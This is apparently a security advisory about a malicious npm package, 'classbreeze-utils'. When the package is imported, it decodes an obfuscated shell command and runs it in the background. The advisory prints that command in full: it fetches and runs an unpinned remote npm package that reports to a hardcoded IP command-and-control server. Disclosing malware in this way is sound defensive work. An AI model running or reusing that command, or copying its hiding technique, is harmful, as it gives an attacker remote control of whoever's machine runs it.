summary: Import-time RCE: spawns unpinned npx payload against hardcoded C2 IP
details: On require('classbreeze-utils') (the declared main entry src/index.js), the package decodes char-code arrays into a shell command and spawns a detached background process: `/bin/sh -c 'nohup npx -y runtimedev-link@latest --token "http://194.11.226.41:4000|<token>" >/dev/null 2>&1 &'` (with a windowsHide exec variant on win32). This fetches and executes an unpinned remote npm package (`runtimedev-link@latest`) as a persistent agent reporting to a bare-IP C2 endpoint at 194.11.226.41:4000. The package advertises itself as a typography/utility helper; the obfuscation (char-code-array string construction), detached/nohup execution, unpinned `@latest` payload, and hardcoded IP+token clearly establish malicious intent. Any process that imports this module silently launches the agent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
